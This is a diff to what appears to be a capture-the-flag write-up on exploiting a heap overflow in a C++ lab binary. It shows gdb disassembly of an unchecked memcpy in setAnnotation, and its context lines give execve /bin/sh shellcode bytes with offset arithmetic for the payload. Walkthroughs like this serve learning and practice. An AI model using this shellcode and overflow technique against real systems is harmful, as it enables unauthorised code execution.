@@ -128,6 +128,36 @@ n
 (gdb) x/4xw $eax
 0x804a078:	0x08048848	0x00000000	0x00000000	0x00000000
 ```
+If we disassembly the `setAnnotation()` function we can see where our string is being stored
+```
+(gdb) disas _ZN1N13setAnnotationEPc
+Dump of assembler code for function _ZN1N13setAnnotationEPc:
+   0x0804870e <+0>:	push   ebp
+   0x0804870f <+1>:	mov    ebp,esp
+   0x08048711 <+3>:	sub    esp,0x18
+   0x08048714 <+6>:	mov    eax,DWORD PTR [ebp+0xc]
+   0x08048717 <+9>:	mov    DWORD PTR [esp],eax
+   0x0804871a <+12>:	call   0x8048520 <strlen@plt>
+   0x0804871f <+17>:	mov    edx,DWORD PTR [ebp+0x8]
+   0x08048722 <+20>:	add    edx,0x4
+   0x08048725 <+23>:	mov    DWORD PTR [esp+0x8],eax
+=> 0x08048729 <+27>:	mov    eax,DWORD PTR [ebp+0xc]
+   0x0804872c <+30>:	mov    DWORD PTR [esp+0x4],eax
+   0x08048730 <+34>:	mov    DWORD PTR [esp],edx
+   0x08048733 <+37>:	call   0x8048510 <memcpy@plt>
+   0x08048738 <+42>:	leave
+   0x08048739 <+43>:	ret
+End of assembler dump.
+(gdb) x/x $eax
+0x6e:	Cannot access memory at address 0x6e
+(gdb) ni
+0x0804872c in N::setAnnotation(char*) ()
+(gdb) x/x $eax
+0xbffff85c:	0x41414141   
+(gdb) x/x $edx
+0x804a00c:	0x00000000  <---------------------- Here we have where our string is being stored if you check what is passed to memcpy() above
+```
+
 We now have enough information to try to get the flag, as we don't have any call to `system()` function here we will need to pass a *shellcode* as in `level2`
 __Shell code__ `'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80'` that gives us a total of `24 bytes` we know the *offset* is 108 - 24 for the shell code and 4 for the address what leaves us with *80 bytes* of random characters
 ```
